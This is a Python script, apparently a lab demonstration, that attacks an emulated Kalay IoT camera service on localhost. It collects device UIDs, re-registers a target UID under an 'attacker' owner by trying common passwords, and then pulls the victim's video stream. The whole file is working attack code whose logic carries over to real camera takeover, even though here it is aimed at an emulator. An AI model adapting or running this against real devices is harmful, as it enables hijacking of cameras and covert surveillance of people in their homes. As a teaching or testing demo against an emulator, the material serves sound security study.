#!/usr/bin/env python3
import requests, time, random

EMULATOR = "http://localhost:5000"

class KalayAttacker:
    def __init__(self):
        self.discovered_uids = []
    
    def discover_uids(self):
        """Simulate UID discovery through network sniffing"""
        print("[*] Scanning for UIDs...")
        # Try to get UIDs from the emulator (simulating leaked UIDs)
        try:
            r = requests.get(f"{EMULATOR}/uids")
            if r.status_code == 200:
                devices = r.json()
                self.discovered_uids = list(devices.keys())
                print(f"[+] Discovered {len(self.discovered_uids)} UIDs: {self.discovered_uids}")
            else:
                # Fallback to common UIDs if /uids endpoint not available
                self.discovered_uids = ["device001", "device002", "cam123", "babycam456"]
                print(f"[+] Using common UIDs: {self.discovered_uids}")
        except:
            self.discovered_uids = ["device001", "device002", "cam123", "babycam456"]
            print(f"[+] Using common UIDs: {self.discovered_uids}")
        
        return self.discovered_uids
    
    def attempt_takeover(self, uid, password_guess=None):
        """Attempt to re-register a UID"""
        print(f"[*] Attempting takeover of UID: {uid}")
        
        # Common password guesses (like in real attacks)
        common_passwords = ["alicepw", "password", "123456", "admin", "password123"]
        password_to_try = password_guess or random.choice(common_passwords)
        
        payload = {
            "uid": uid,
            "owner": "attacker",
            "password": password_to_try
        }
        
        print(f"[*] Trying password: {password_to_try}")
        
        try:
            r = requests.post(EMULATOR + "/register", json=payload, timeout=5)
            if r.status_code == 200:
                print(f"[+] SUCCESS: Taken over UID {uid} with password '{password_to_try}'")
                return True
            else:
                print(f"[-] Failed with password '{password_to_try}': {r.json().get('reason', 'unknown error')}")
                return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return False
    
    def hijack_stream(self, uid):
        """Access the video stream after successful takeover"""
        print(f"[*] Accessing stream for {uid}...")
        r = requests.get(f"{EMULATOR}/stream/{uid}")
        if r.status_code == 200:
            print(f"[+] STREAM HIJACKED: {r.text.strip()}")
            return True
        else:
            print(f"[-] Failed to access stream: {r.status_code}")
            return False

if __name__ == "__main__":
    attacker = KalayAttacker()
    
    # Attack sequence
    print("🔓 Starting Kalay UID Impersonation Attack")
    print("=" * 50)
    
    attacker.discover_uids()
    time.sleep(2)
    
    # Try to take over first discovered UID
    if attacker.discovered_uids:
        target_uid = attacker.discovered_uids[0]
        if attacker.attempt_takeover(target_uid, "alicepw"):  # Use known password for demo
            time.sleep(1)
            attacker.hijack_stream(target_uid)
        else:
            print("[-] Attack failed - UID takeover unsuccessful")
    else:
        print("[-] No UIDs discovered for attack")
